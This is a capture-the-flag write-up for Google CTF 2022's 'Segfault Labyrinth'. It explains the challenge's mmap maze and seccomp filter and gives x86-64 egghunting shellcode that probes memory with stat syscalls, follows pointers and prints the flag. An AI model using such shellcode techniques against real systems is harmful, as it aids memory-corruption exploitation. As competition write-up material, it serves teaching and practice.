---
layout: default
title: "labyrinth - Google CTF Quals 2022"
date: 2022-07-03
permalink: /labyrinth/
categories: ctf misc pwn shellcode
---

Segfault Labyrinth was a Misc shellcoding challenge from Google CTF Quals 2022. I spent several hours more than I should have on it due to a misunderstanding!
<!--more-->

# Segfault Labyrinth
### Or, 'wasting 4 hours because of forgetting the RDI register'


## Summary
The challenge sets up a 'labyrinth' - it repeatedly:
- Creates 16 buffers using `mmap` of size 0x1000
- One of the buffers will randomly be made RW, the others unread/writable
- The writable buffer will be filled with *another* 16 pointers
- On the final iteration, the flag will be placed into the writable buffer

```
Start              End                Offset             Perm Path
0x000000216232b000 0x000000216232c000 0x0000000000000000 ---
0x0000002901d92000 0x0000002901d93000 0x0000000000000000 ---
0x0000005072377000 0x0000005072378000 0x0000000000000000 ---
0x0000006b94774000 0x0000006b94775000 0x0000000000000000 ---
0x0000008138651000 0x0000008138652000 0x0000000000000000 rw-
0x000000836c41e000 0x000000836c41f000 0x0000000000000000 ---
0x0000008edbdbb000 0x0000008edbdbc000 0x0000000000000000 ---
0x0000008f2b16e000 0x0000008f2b16f000 0x0000000000000000 ---
0x00000098a3158000 0x00000098a3159000 0x0000000000000000 ---
0x000000a0382d5000 0x000000a0382d6000 0x0000000000000000 ---
0x000000b03e0d6000 0x000000b03e0d7000 0x0000000000000000 ---
0x000000bf72b24000 0x000000bf72b25000 0x0000000000000000 rw-
0x000000d34b6b8000 0x000000d34b6b9000 0x0000000000000000 ---
0x000000ded7273000 0x000000ded7274000 0x0000000000000000 ---
0x00000100f8fda000 0x00000100f8fdb000 0x0000000000000000 rw-
0x0000010233ca9000 0x0000010233caa000 0x0000000000000000 ---
0x00000109cf93e000 0x00000109cf93f000 0x0000000000000000 ---
0x0000011447b83000 0x0000011447b84000 0x0000000000000000 ---
0x000001190cdf7000 0x000001190cdf8000 0x0000000000000000 ---
0x0000012200864000 0x0000012200865000 0x0000000000000000 ---
0x0000012e6860b000 0x0000012e6860c000 0x0000000000000000 rw-
0x000001381824a000 0x000001381824b000 0x0000000000000000 ---
0x00000140e0f86000 0x00000140e0f87000 0x0000000000000000 rw-
0x0000015014adb000 0x0000015014adc000 0x0000000000000000 ---
0x00000153ea448000 0x00000153ea449000 0x0000000000000000 ---
0x0000015b5af6c000 0x0000015b5af6d000 0x0000000000000000 ---
0x00000168e122f000 0x00000168e1230000 0x0000000000000000 ---
[ ... ]
gef➤  search-pattern CTF{
[+] Searching 'CTF{' in memory
[+] In (0xbf72b24000-0xbf72b25000), permission=rw-
  0xbf72b24000 - 0xbf72b24018  →   "CTF{PLACEHOLDERFLAGHERE}\n"
gef➤  vmmap 0xbf72b24000
[ Legend:  Code | Heap | Stack ]
Start              End                Offset             Perm Path
0x000000bf72b24000 0x000000bf72b25000 0x0000000000000000 rw-
```

The challenge then loads a seccomp filter:
```
line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x01 0x00 0xc000003e  if (A == ARCH_X86_64) goto 0003
 0002: 0x06 0x00 0x00 0x00000000  return KILL
 0003: 0x20 0x00 0x00 0x00000000  A = sys_number
 0004: 0x15 0x00 0x01 0x0000000f  if (A != rt_sigreturn) goto 0006
 0005: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0006: 0x15 0x00 0x01 0x000000e7  if (A != exit_group) goto 0008
 0007: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0008: 0x15 0x00 0x01 0x0000003c  if (A != exit) goto 0010
 0009: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0010: 0x15 0x00 0x01 0x00000000  if (A != read) goto 0012
 0011: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0012: 0x15 0x00 0x01 0x00000009  if (A != mmap) goto 0014
 0013: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0014: 0x15 0x00 0x01 0x0000000b  if (A != munmap) goto 0016
 0015: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0016: 0x15 0x00 0x01 0x00000005  if (A != fstat) goto 0018
 0017: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0018: 0x15 0x00 0x01 0x00000004  if (A != stat) goto 0020
 0019: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0020: 0x15 0x00 0x01 0x00000001  if (A != write) goto 0022
 0021: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0022: 0x06 0x00 0x00 0x00000000  return KIL
```
It copies a short shellcode prologue, before copying our input (more shellcode) into a buffer, then executes it, passing a pointer to the first buffer (the start of 'the labyrinth').
![prefix](https://imgur.com/pKfq1Q8.png)

## Attempt 1
It seems like all registers have been cleared - we have no context for where any code or memory is located. However, there are ways to scan through memory without crashing, often known as egghunting. The general approach is to
- Use a syscall which takes a pointer (`write`, `access`, `stat`) on an address
- Syscall's won't segfault, and will instead return `-EFAULT` (`0xfffffffffffffff2`)
- A return value of `-EFAULT` means that the page isn't mapped, so we increment the address by 0x1000 and try again
- If a mapped page is found, we can either conclude our search or iterate through the page itself, searching for the 'egg' (a short marker value)

In this case, as we would have no idea of the memory layout of the chunks, my strategy was to try and locate the stack. We would then be able to locate the address of the start of the buffer on the stack, and follow the pointers.
```nasm
[bits 64]
mov rdi, 0x7ff000000000 ; common stack prefix to start our search
mov rsi, rdi 
loop:
mov rax, 4  ; SYS_stat
syscall
cmp al, 0xf2 ; -EFAULT
jne out      ; Is a valid address, search is done
add rdi, 0x1000  ; Go to the next page and continue the search
mov rsi, rdi
jmp loop
out:
int3
```
This takes around 5 seconds to locate the stack pointer.
However, no matter what I tried, the offset to the pointer seemed to be inconsistent. I went back to the binary to try and statically discover the offset to the pointer, and at this point noticed something.

![rdilol](https://imgur.com/ZXUZFbe.png)
Due to my screen layout, the register display had been cut off - I missed the fact that **RDI was never cleared**, and contains the pointer to the start of the buffer.

![brain](https://imgur.com/XmSb49w.png)

## Attempt 2
So, the start of the labyrinth is in RDI. Now, all we need to do is follow the links, using egghunter-type syscalls to check the readability of a pointer.
```nasm
[bits 64]
lea rsp, [rdi + 160] ; give us stack space so we can call/ret
check_chunk:
mov r14d, [rdi] ; load the dword at the start of the buffer
cmp r14d, 0x7b465443 ; if it's equal to 'CTF{', we got it!
je flag
mov r15, rdi
loop:         ; loop over the 16 pointers
mov rdi, [r15]
call is_readable
cmp al, 1     ; if readable, jump to check_chunk, recursing
je check_chunk
add r15, 8    ; otherwise, add 8 and go to the next pointer
jmp loop

is_readable:
mov rax, 4    ; SYS_stat
lea rsi, [rdi+0x80] ; avoid clobbering pointers in case stat does end up writing to the chunk
syscall
cmp al, 0xf2 ; check if result was EFAULT
jne yes
mov al, 0
ret
yes:
mov al, 1
ret

flag:   ; rdi points to the flag, write it out!
mov rax, 1
mov rsi, rdi
mov rdi, 1
mov rdx, 100
syscall
```

We can assemble and upload our program, and get the flag:
```sh
> python3 solve.py
[+] Opening connection to segfault-labyrinth.2022.ctfcompetition.com on port 1337: Done
[*] Paused (press any to continue)
[*] Switching to interactive mode
== proof-of-work: disabled ==
Welcome to the Segfault Labyrinth
CTF{c0ngratulat1ons_oN_m4k1nG_1t_thr0uGh_th3_l4Byr1nth}
\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00[*] Got EOF while reading in interactive
$
```

